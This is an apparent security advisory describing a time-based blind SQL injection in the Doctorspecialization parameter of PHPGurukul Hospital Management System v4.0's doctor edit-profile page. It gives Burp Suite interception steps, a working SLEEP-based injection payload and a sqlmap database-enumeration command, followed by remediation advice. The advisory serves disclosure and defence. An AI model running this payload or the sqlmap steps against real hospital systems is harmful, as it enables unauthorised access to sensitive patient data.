
# Time-Based Blind SQL Injection Vulnerability Report

## Affected Product

| **Attribute**         | **Details**                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
| **Product Name**      | Hospital Management System                                                  |
| **Vendor**            | PHPGurukul                                                                  |
| **Version**           | v4.0                                                                        |
| **Affected File**     | `hospital/hms/doctor/edit-profile.php`                                              |
| **Affected Parameter**| `Doctorspecialization`                                                                  |
| **Method**            | `POST`                                                                      |
| **Vulnerability Type**| Time-Based Blind SQL Injection                                              |

## Official Website

[PHPGurukul Hospital Management System v4.0](https://phpgurukul.com/hospital-management-system-in-php/)

## Vulnerability Overview

A time-based blind SQL injection vulnerability exists in the `Doctorspecialization` parameter  of **Hospital Management System v4.0**, allowing remote attackers to execute arbitrary SQL commands by triggering time delays in the database response.

## Steps to Reproduce

### 1. Access the Vulnerable URL

- Enable Burp Suite and configure your browser to route traffic through it.
- Visit the doctor Login page, which redirects to `index.php`.
- Fill in the email and password fields and autheticate. Then navigate to edit-profile.php fill any data you wish turn on intercept. 

```
http://192.168.137.89/hospital/hms/doctor/index.php
```

![Login Page](https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Time-based-blind-sql-on-doctor-edit-profile/1.png)

![Login Page](https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Time-based-blind-sql-on-doctor-edit-profile/2.png)

---

### 2. Intercept the Request

- Send the intercepted request to **Repeater** in Burp Suite.
- Add an asterisk `*` to the `Doctorspecialization` field to identify injection points.
- Save the modified HTTP request as `sql` for SQLMap.

![Burp Repeater Modification](https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Time-based-blind-sql-on-doctor-edit-profile/3.png)

![Burp Repeater Modification](https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Time-based-blind-sql-on-doctor-edit-profile/4.png)


---

### 3. Manual Exploitation (Not Recommended)

- Use the following payload in the `Doctorspecialization` field to test time-based SQL injection manually:

```sql
Doctorspecialization=ENT' AND (SELECT 5721 FROM (SELECT(SLEEP(5)))lDqQ) AND 'HSVc'='HSVc&docname=&clinicaddress=&docfees=300&doccontact=123456789&docemail=doctor@email.com&submit=
```

> ⚠️ Manual testing of time-based injections is slow and prone to error. It's recommended to use **SQLMap** for automated exploitation and enumeration.

---

### 4. Automated Exploitation Using SQLMap

To list the databases via SQLMap:

- Open Kali Linux terminal and run:

```bash
sqlmap -r sql --dbs
```

- This command uses the `sql` request file (`-r` flag) and attempts to enumerate databases using the `--dbs` flag.

![SQLMap Database Enumeration](https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Time-based-blind-sql-on-doctor-edit-profile/5.png)

![SQLMap Database Enumeration](https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Time-based-blind-sql-on-doctor-edit-profile/6.png)

![SQLMap Database Enumeration](https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Time-based-blind-sql-on-doctor-edit-profile/7.png)

---

## Remediation

1. **Use Prepared Statements (Parameterized Queries):**  
   Avoid dynamic SQL queries that directly concatenate user input.

2. **Input Validation & Sanitization:**  
   Implement strong input validation and reject inputs containing SQL metacharacters.

3. **Least Privilege Principle:**  
   Ensure the database account used by the application has only the minimum required privileges.

4. **Web Application Firewall (WAF):**  
   Deploy a WAF to detect and block malicious SQL queries.

5. **Error Handling:**  
   Suppress detailed database errors from user-facing interfaces.

---

## References

- OWASP Top 10 - [A03: Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [SQLMap Tool](https://sqlmap.org)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

## Disclosure Timeline

| Date       | Activity                             |
|------------|--------------------------------------|
| 2025-06-08 | Vulnerability Identified via SQLMap  |

---

## Author

**Report generated by:** `Subhash Paudel`  
**Tool Used:** SQLMap  
